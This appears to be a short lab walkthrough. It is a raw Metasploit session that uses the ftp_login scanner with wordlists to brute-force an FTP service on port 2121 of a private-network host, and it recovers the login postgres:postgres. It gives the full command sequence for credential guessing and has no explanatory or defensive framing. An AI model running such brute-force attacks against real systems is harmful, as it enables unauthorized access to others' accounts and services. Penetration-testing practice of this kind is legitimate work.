# Attacking on Port 2121

```


msf > search ftp_login
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                             Disclosure Date  Rank    Description
   ----                             ---------------  ----    -----------
   auxiliary/scanner/ftp/ftp_login                   normal  FTP Authentication Scanner


msf > use auxiliary/scanner/ftp/ftp_login 
msf auxiliary(ftp_login) > 
msf auxiliary(ftp_login) > show options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting                                                    Required  Description
   ----              ---------------                                                    --------  -----------
   BLANK_PASSWORDS   false                                                              no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                                  yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                              no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                              no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                              no        Add all users in the current database to the list
   PASSWORD                                                                             no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  no        File containing passwords, one per line
   Proxies                                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false                                                              no        Record anonymous/guest logins to the database
   RHOSTS            192.168.56.101                                                     yes       The target address range or CIDR identifier
   RPORT             2121                                                               yes       The target port (TCP)
   STOP_ON_SUCCESS   true                                                               yes       Stop guessing when a credential works for a host
   THREADS           1                                                                  yes       The number of concurrent threads
   USERNAME                                                                             no        A specific username to authenticate as
   USERPASS_FILE                                                                        no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                              no        Try the username as the password for all users
   USER_FILE         /usr/share/metasploit-framework/data/wordlists/unix_users.txt      no        File containing usernames, one per line
   VERBOSE           true                                                               yes       Whether to print output for all attempts

msf auxiliary(ftp_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/blank.txt
PASS_FILE => /usr/share/metasploit-framework/data/wordlists/blank.txt
msf auxiliary(ftp_login) > use USER_AS_PASS true

ls
[-] Failed to load module: USER_AS_PASS
msf auxiliary(ftp_login) > 
msf auxiliary(ftp_login) > ls
[*] exec: ls

shell3.rar
spvreddy
user
msf auxiliary(ftp_login) > set USER_AS_PASS true

USER_AS_PASS => true

msf auxiliary(ftp_login) > run

msf auxiliary(ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/spv1.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/spv1.txt
msf auxiliary(ftp_login) > run

[*] 192.168.56.101:2121   - 192.168.56.101:2121 - Starting FTP login sweep
[!] 192.168.56.101:2121   - No active DB -- Credential data will not be saved!
[-] 192.168.56.101:2121   - 192.168.56.101:2121 - 
[+] 192.168.56.101:2121   - 192.168.56.101:2121 - Login Successful: postgres:postgres
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed


```



